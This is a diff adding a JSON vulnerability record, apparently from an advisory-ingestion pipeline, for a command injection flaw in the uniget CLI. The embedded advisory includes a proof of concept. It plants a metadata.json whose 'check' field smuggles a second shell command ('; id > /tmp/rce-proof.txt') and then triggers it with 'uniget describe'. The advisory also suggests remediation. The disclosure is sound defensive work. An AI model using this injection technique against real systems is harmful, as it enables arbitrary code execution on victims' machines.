@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/161853795?v=4\", \"events_url\": \"https://api.github.com/users/0x5t4l1n/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/0x5t4l1n/followers\", \"following_url\": \"https://api.github.com/users/0x5t4l1n/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/0x5t4l1n/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/0x5t4l1n\", \"id\": 161853795, \"login\": \"0x5t4l1n\", \"node_id\": \"U_kgDOCaWxYw\", \"organizations_url\": \"https://api.github.com/users/0x5t4l1n/orgs\", \"received_events_url\": \"https://api.github.com/users/0x5t4l1n/received_events\", \"repos_url\": \"https://api.github.com/users/0x5t4l1n/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/0x5t4l1n/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/0x5t4l1n/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/0x5t4l1n\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45152\", \"cvss\": {\"score\": 7.8, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.8, \"vector_string\": \"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-78\", \"name\": \"Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"}], \"description\": \"I discovered a command injection vulnerability in uniget that allows arbitrary command execution through the metadata loading and version check mechanism.\\n\\n### Summary\\n\\nA command injection vulnerability exists in uniget due to unsafe execution of the `check` field from metadata files using `/bin/bash -c`. Because the `check` field is loaded directly from untrusted JSON metadata without validation or sanitization, an attacker can craft malicious metadata that executes arbitrary shell commands on the victim’s system when common uniget operations such as `describe`, `install`, `update`, or `inspect` are performed.\\n\\nThis vulnerability can lead to arbitrary code execution with the privileges of the user running uniget.\\n\\n### Details\\n\\nThe vulnerable code is located in:\\n\\n`tool.go:250`\\n\\nVulnerable function:\\n\\n```go id=\\\"f2g0ic\\\"\\nfunc (tool *Tool) RunVersionCheck() (string, error) {\\n    cmd := exec.Command(\\\"/bin/bash\\\", \\\"-c\\\", tool.Check+\\\" | tr -d '\\\\n'\\\")\\n    version, err := cmd.Output()\\n    return string(version), nil\\n}\\n```\\n\\nThe issue occurs because the `tool.Check` field is populated directly from metadata JSON files without validation.\\n\\nRelated structure:\\n\\n```go id=\\\"7f4yzm\\\"\\ntype Tool struct {\\n    Check string\\n}\\n```\\n\\nMetadata loading uses `json.Unmarshal()` to populate the `Tool` struct directly from JSON metadata, allowing attacker-controlled input to reach the shell execution sink.\\n\\nBecause `/bin/bash -c` is used, shell metacharacters such as `;`, `&&`, `|`, `$()`, and backticks are interpreted by the shell, enabling arbitrary command injection.\\n\\n### PoC\\n\\nStep 1 — Verify the vulnerable binary:\\n\\n```bash id=\\\"7k3d07\\\"\\n/tmp/uniget-bin --version\\n```\\n\\nOutput:\\n\\n```text id=\\\"p2gk9z\\\"\\nuniget version main\\n```\\n\\nStep 2 — Create malicious metadata cache:\\n\\n```bash id=\\\"j5zpr0\\\"\\nmkdir -p ~/.local/var/cache/uniget\\n\\ncat > ~/.local/var/cache/uniget/metadata.json << 'EOF'\\n{\\n  \\\"tools\\\": [\\n    {\\n      \\\"name\\\": \\\"evil-tool\\\",\\n      \\\"version\\\": \\\"1.0.0\\\",\\n      \\\"binary\\\": \\\"${target}/bin/evil-tool\\\",\\n      \\\"check\\\": \\\"echo '1.0.0'; id > /tmp/rce-proof.txt\\\",\\n      \\\"tags\\\": [\\\"test\\\"],\\n      \\\"description\\\": \\\"RCE test\\\",\\n      \\\"repository\\\": \\\"https://example.com\\\",\\n      \\\"license\\\": {\\n        \\\"name\\\": \\\"MIT\\\",\\n        \\\"link\\\": \\\"https://example.com\\\"\\n      },\\n      \\\"sources\\\": [\\n        {\\n          \\\"registry\\\": \\\"ghcr.io\\\",\\n          \\\"repository\\\": \\\"uniget-org/tools\\\"\\n        }\\n      ]\\n    }\\n  ]\\n}\\nEOF\\n```\\n\\nStep 3 — Create placeholder binary:\\n\\n```bash id=\\\"53ml7u\\\"\\nmkdir -p ~/.local/usr/local/bin\\n\\ncat > ~/.local/usr/local/bin/evil-tool << 'EOF'\\n#!/bin/bash\\necho \\\"placeholder\\\"\\nEOF\\n\\nchmod +x ~/.local/usr/local/bin/evil-tool\\n```\\n\\nStep 4 — Trigger the vulnerable workflow:\\n\\n```bash id=\\\"w4j7h4\\\"\\n/tmp/uniget-bin describe evil-tool --prefix ~/.local\\n```\\n\\nApplication output:\\n\\n```text id=\\\"q0k54m\\\"\\nName: evil-tool\\n  Description: RCE test\\n  Repository: https://example.com\\n  Version: 1.0.0\\n  Check: <echo '1.0.0'; id > /tmp/rce-proof.txt>\\n```\\n\\nStep 5 — Verify arbitrary command execution:\\n\\n```bash id=\\\"w7r8z3\\\"\\nls -la /tmp/rce-proof.txt\\ncat /tmp/rce-proof.txt\\n```\\n\\nActual output:\\n\\n```bash id=\\\"6plm7v\\\"\\n-rw-rw-r-- 1 w4nn4d13 w4nn4d13 253 May 7 23:53 /tmp/rce-proof.txt\\n\\nuid=1000(w4nn4d13) gid=1000(w4nn4d13) groups=1000(w4nn4d13),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),106(bluetooth),108(lpadmin),112(kaboxer),113(wireshark),128(docker)\\n```\\n\\n<img width=\\\"1107\\\" height=\\\"694\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/857dbec9-9e51-4676-bf90-e529ad23b9a7\\\" />\\n\\n<img width=\\\"1909\\\" height=\\\"631\\\" alt=\\\"image\\\" src=\\\"https://github.com/user-attachments/assets/f4a1bac2-634e-4f67-91cb-c8684f442b4e\\\" />\\n\\n\\nThis confirms arbitrary command execution through the untrusted `check` field loaded from metadata.\\n\\n### Impact\\n\\nThis issue allows arbitrary command execution on systems running uniget when processing malicious metadata.\\n\\nAn attacker may be able to:\\n\\n* Execute arbitrary shell commands\\n* Exfiltrate sensitive files or environment variables\\n* Install malware or backdoors\\n* Modify or delete accessible files\\n* Establish persistence on the victim machine\\n* Compromise CI/CD environments using uniget automation\\n\\nAny user importing or processing attacker-controlled metadata may be impacted.\\n\\n### Suggested Remediation\\n\\nAvoid using `/bin/bash -c` with untrusted input.\\n\\nInstead of:\\n\\n```go id=\\\"ntxjlwm\\\"\\nexec.Command(\\\"/bin/bash\\\", \\\"-c\\\", tool.Check+\\\" | tr -d '\\\\n'\\\")\\n```\\n\\nconsider executing fixed binaries and arguments directly without invoking a shell.\\n\\nFor example:\\n\\n```go id=\\\"ngbkk2\\\"\\nexec.Command(binary, \\\"--version\\\")\\n```\\n\\nor sanitize and strictly validate allowed commands before execution.\\n\\nThank you for your time and for maintaining the project. Please let me know if you need any additional information or a more detailed proof of concept.\", \"epss\": {\"percentage\": 0.00715, \"percentile\": 0.49553}, \"ghsa_id\": \"GHSA-qqq4-5773-pmw5\", \"github_reviewed_at\": \"2026-05-13T15:33:10Z\", \"html_url\": \"https://github.com/advisories/GHSA-qqq4-5773-pmw5\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-qqq4-5773-pmw5\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45152\"}], \"nvd_published_at\": \"2026-05-27T22:16:36Z\", \"published_at\": \"2026-05-13T15:33:10Z\", \"references\": [\"https://github.com/uniget-org/cli/security/advisories/GHSA-qqq4-5773-pmw5\", \"https://github.com/uniget-org/cli/releases/tag/v0.27.1\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-45152\", \"https://github.com/advisories/GHSA-qqq4-5773-pmw5\"], \"repository_advisory_url\": \"https://api.github.com/repos/uniget-org/cli/security-advisories/GHSA-qqq4-5773-pmw5\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/uniget-org/cli\", \"summary\": \"uniget is Vulnerable to Command Injection in tool.Check Leading to Arbitrary Code Execution\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:55:03Z\", \"url\": \"https://api.github.com/advisories/GHSA-qqq4-5773-pmw5\", \"vulnerabilities\": [{\"first_patched_version\": \"0.27.1\", \"package\": {\"ecosystem\": \"go\", \"name\": \"gitlab.com/uniget-org/cli\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.27.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-qqq4-5773-pmw5",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "gitlab.com/uniget-org/cli: < 0.27.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-45152"
+    ],
+    "cvss_score": 7.8,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "gitlab.com/uniget-org/cli"
+    ],
+    "remote": false,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.920510Z",
+  "provenance": {
+    "content_sha256": "5fe47a0d40b7e56e179194a287ad0dae377375fe2dab60f8f879dc9b65ff65db",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-13T15:33:10Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-qqq4-5773-pmw5",
+  "status": "active",
+  "title": "uniget is Vulnerable to Command Injection in tool.Check Leading to Arbitrary Code Execution",
+  "updated_at": "2026-06-08T23:55:03Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-qqq4-5773-pmw5"
+}
